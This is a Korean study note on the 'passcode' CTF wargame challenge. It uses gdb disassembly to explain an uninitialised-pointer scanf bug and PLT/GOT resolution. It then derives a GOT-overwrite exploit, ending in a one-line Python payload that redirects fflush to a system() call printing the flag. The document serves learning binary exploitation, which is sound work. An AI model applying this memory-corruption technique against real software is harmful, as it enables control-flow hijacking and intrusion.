#passcode문제. 어려웠다. 

cat passcode.c
gdb ./passcode
b login
b welcome
run
disas




1. 	sub    $0x88,%esp 
	이것이 name 배열 변수를 지정해준 것이 아닌가 의심을 할 수 있다.


	int a=\xbfbfbfbf;   //a=\xbfbfbfbf으로 초기화

	scanf("%d",&a);      //a라는 변수의 이름에 해당하는 주소를 참조해서 그 주소에 입력받은 값 저장

	scanf("%d",a);        //a(\xbfbfbfbf)이라는 주소에 입력받은 값 저장

	전자는 a변수의 주소에 입력값을 저장하는 것이다. %d이니까 십진수의 값일 것이다.
	후자는 a라는 주소에 입력값을 저장하는 것이다. 이것을 명심하자. 



2. 0x0804862a <+33>:	mov    $0x80487dd,%eax
   0x0804862f <+38>:	lea    -0x70(%ebp),%edx
   0x08048632 <+41>:	mov    %edx,0x4(%esp)
   0x08048636 <+45>:	mov    %eax,(%esp)

   이 부분에 주목 . scanf가 불리기 전에 보면은 
   ebp-0x70을 edx레지스터에 저장하고 
   edx, eax에 담긴 값을 각각 esp+4, esp에 값을 옮겨놓는다. 
   그리고 나서 scanf를 호출하는 것을 보면 edx와 eax를 scanf의 전달인자로 사용함을 알 수 있다.
	
	eax를 확인해보자.

	>> x/s 0x80487dd. "100%s"이다. 

	그렇다면 edx는 -0x70(%ebp)은 name[100]이 시작되는 주소

	name[100]은  -0x70(%ebp) ~ -0xc(%ebp)에 위치

	>> disas login
	

	 0x08048577 <+19>:	mov    $0x8048783,%eax
  	 0x0804857c <+24>:	mov    -0x10(%ebp),%edx
  	 0x0804857f <+27>:	mov    %edx,0x4(%esp)
   	 0x08048583 <+31>:	mov    %eax,(%esp)

	첫번째 scanf의 확인을 해보니까 passcode를 받는 주소의 위치를 확인해보니 -0x10(%ebp) 레지스터 안의 값이다. 즉, name buffer의 마지막 4byte에 적혀있는 값을 이용하면 될 듯하다. lea가 아닌 mov 임에 주목.


3.  plt와 got에 대해서 대강 이해해보자. 
 	plt는 외부 프로시져 연결 table을 뜻한다. plt를 통해 다른 라이브러리에 있는 프로시져를 호출 할 수 있다. 
 	got는 plt가 참조하는 테이블, 프로시저들의 주소가 들어있다. 

 	캐시의 동작원리와 비슷한듯하다. 

 	함수 호출(plt 호출) -> Got로 jump(got에 실제함수의 주소가 들어있다.)
 	1) 첫번째 호출: Got에 함수의 주소가 기록되어있지 않다. 그렇다면 +6에서 어떠한 과정을 통해서 그 함수의 주소를 알아서 불러낸다.
 	2) 둡너째 호출: 첫번째에서 알아 낸 주소로 점프한다. 

 	그렇다면 우리는 fflush가 plt로 호출될때는 exploit하자. 
	
	0x08048593 <+47>:	call   0x8048430 <fflush@plt>
	이부분을 통해서 fflush@plt의 주소를 알아낼 수 있다. 

   	>>x/10i 0x8048430   이 커맨드로 기계어를 호출하자

   	0x8048430 <fflush@plt>:	jmp    *0x804a004
   	0x8048436 <fflush@plt+6>:	push   $0x8
   	0x804843b <fflush@plt+11>:	jmp    0x8048410
	
	이렇게 되어있다. 

	0x804a004여기로 점프하니까 여기를 확인해보자. 


	*0x804a004라고 적혀있으니 이 값의 주소로 점프하라는 것 같다. *이 붙어있는 이유는 포인터라서 그런 것으로 추축이 된다. 

	>> x/x *0x804a004
	0x8048436 <fflush@plt+6>:	0x68 
	으로 저안의 값으로 이동한 것 같다.

	즉 plt -> got안의 값이 아직 없어서 주소를 찾는 과정으로 점프하는 것 같다. 
	우리는 got의 주소가 필요

	got의 주소는 
	>> x/x 0x804a004
	0x804a004 <fflush@got.plt>:	0x36 
	got의 주소를 찾았다. 

	0x804a004이다. 

	그러므로 payload는 name에 96개의 더미값을 넣고 0x804a004을 4byte string으로 채워준다. 그러면 passcode는 fflush got의 주소값을 덮어씌우게 되는 것이다. 마지막 4byte의 주소안의 값을 새로 써주는 거다. 입력값으로. 

	그 입력값을 

	>> disas login

	return한번 더 쳐서 끝까지 확인하자 그러면 이 부분을 확인할 수 있다.
	0x080485e3 <+127>:	movl   $0x80487af,(%esp)
  	0x080485ea <+134>:	call   0x8048460 <system@plt>

	그러므로 fflush의 got에다가 0x080485e3 이것을 씌운다면 fflush대신에 우리가 원하는 flag를 바로 출력하는 system call을 호출할 수 있게 되는 것이다.


4. 134514147 = 0x080485e3이다. scanf가 십진법 정수를 받기 때문에 바꾸어서 사용한 것이다. 
   Answer: (python -c 'print "A"*96+"\x04\xa0\x04\x08"+"134514147"') | ./passcode
   
   그렇다면 별거 아니다 
   시작부분을 잘 생각해보고, 더미값을 쭉넣고 그리고 나서 그 주소에 필요한것을 덮어 씌우면 된다. 

   x/s, x/10i이런것을 잘활용하자. 
   x/s 그 주소의 값을 스트링으로 보여준다.


 
5. 
	write권한이 있는 메모리 주소를 가리키게 하고 이곳에 원하는 함수 이름을 적는다면

	참조되지 않은 함수를 호출할 수 있는 익스플로잇이 가능하다고 하네요

	출처: http://noisivohees.tistory.com/26?category=615633 [bbbbbbkim_not_using]
   

   scanf의 동작원리를 잘 생각하자 











reference.
http://noisivohees.tistory.com/25_해설
http://noisivohees.tistory.com/22   _ plt, got 정리
http://noisivohees.tistory.com/26?category=615633_ plt, got 정리2